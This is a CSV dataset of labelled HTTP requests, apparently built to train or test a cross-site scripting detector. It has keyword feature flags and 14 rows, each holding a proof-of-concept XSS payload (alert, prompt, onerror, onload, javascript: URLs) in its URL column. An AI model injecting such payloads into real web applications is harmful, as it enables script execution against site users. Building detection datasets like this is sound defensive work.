src_port,dest_port,http_method,http_status,http_resp_len,http_url_len,url_contains_script_tag,url_contains_onerror,url_contains_onload,url_contains_onclick,url_contains_onmouseover,url_contains_onfocus,url_contains_alert,url_contains_javascript,url_contains_eval,url_contains_document,url_contains_cookie,url_contains_iframe,url_contains_svg,url_contains_img,url_contains_object,url_contains_embed,http_method_GET,http_method_POST,http_method_PUT,http_method_DELETE,url_has_query_params,url_query_param_count,url_encoded_chars,url_suspicious_chars,response_2xx,response_3xx,response_4xx,response_5xx,is_malicious,attack_type,timestamp,original_url
51660,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:37:57.325859+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
51668,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:37:59.339794+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
50374,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:01.353664+0000,/?q=<body%20onload=alert(1)>
50384,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:03.366458+0000,/?q=<details%20open%20ontoggle=alert(1)>
50390,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:05.379351+0000,"/?q=""><svg%20onload=alert(1)>"
50404,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:07.391753+0000,/?q=</textarea><script>alert(1)</script>
50408,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:09.404576+0000,/?q=<img%20src=1%20onerror=prompt(1)>
36802,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:11.417678+0000,/?q=<marquee%20onstart=confirm(1)>
36818,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:13.432080+0000,/?q=<script>/*</script><script>alert(1)</script>
36824,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:15.445355+0000,/?q=<script>''-alert(1)//</script>
36834,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:38:17.458282+0000,/?q=<svg><script>alert(1)</script></svg>
36844,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:19.470642+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
34548,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:21.484307+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
34564,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:38:23.497417+0000,/?q=<object%20data='javascript:alert(1)'>
